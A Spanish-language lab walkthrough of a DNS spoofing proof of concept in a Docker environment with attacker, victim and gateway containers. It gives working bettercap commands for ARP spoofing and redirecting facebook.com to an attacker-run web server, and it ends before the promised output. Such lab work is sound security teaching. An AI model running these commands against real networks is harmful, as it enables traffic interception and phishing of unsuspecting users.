Para hacer el Proof of Concept del DNS Spoofing, creamos un entorno Docker con 3 máquinas:  

- Atacante: un kali linux con la herramienta bettercap, con el que haremos el ataque. Además, cuenta con un servidor nginx que es al que redigiremos a la víctima.  
- Cliente: la víctima de este ataque. Cuenta con herramientas como dig y un navegador web, lynx, para comprobar que el ataque ha funcionado.  
- Gateway: Simula el router de la red. Las otras dos máquinas la tienen como ruta default y simplemente redirige todo el tráfico que le llega.  

Levantamos el entorno con `sudo docker-compose up –d –build`  y comenzamos el ataque: 

- En una terminal abrimos un bash en el atacante con `sudo docker exec –it atacante bash`. En otra, nos conectamos al cliente con `sudo docker exec –it atacante bash`.   

- Comenzamos el ataque: en la máquina atacante ejecutamos `bettercap -iface eth0`. Seguidamente, ejecutamos `net.probe on` para detectar el resto de dispositivos en la red.  

- Para visualizar estos dispositivos, ejecutamos `net.show`. 

- Ahora haremos un arp spoofing. Para ello, ejecutamos:
```bash
set arp.spoof.targets 172.21.0.2, 172.21.0.100
arp.spoof on.  
```
- Como vemos, el cliente tiene la direccion MAC del atacante como si fuera la del gateway en su caché ARP. 

- Para efectuar el dns spoofing, ahora escribimos los comandos
```bash
set dns.spoof.domains facebook.com
set dns.spoof.address 172.21.0.101
dns.spoof on. 
```
- Al hacer dig facebook.com, el cliente encontrará la IP del atacante. 

- Y al usar el navegador, `lynx facebook.com`, verá la página web del atacante.  

- Para ambas situaciones, en intrerfaz de bettercap veremos lo siguiente: 

 

 
